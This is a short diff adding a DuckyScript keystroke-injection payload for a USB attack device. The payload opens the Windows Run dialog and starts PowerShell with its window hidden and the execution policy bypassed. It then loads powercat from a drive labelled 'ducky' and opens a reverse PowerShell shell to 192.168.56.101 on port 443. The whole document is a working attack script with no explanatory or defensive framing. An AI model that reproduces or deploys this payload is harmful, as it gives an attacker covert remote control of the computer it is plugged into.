@@ -1,0 +1,6 @@
+DELAY 500
+CAPSLOCK 
+GUI R
+DELAY 500
+STRING powershell.exe -ex unrestricted -WindowStyle Hidden -c "Import-Module ((Get-Volume -FileSystemLabel ducky).driveletter + ':\powercat.ps1'); powercat -c 192.168.56.101 -p 443 -ep;read-host" 
+ENTER
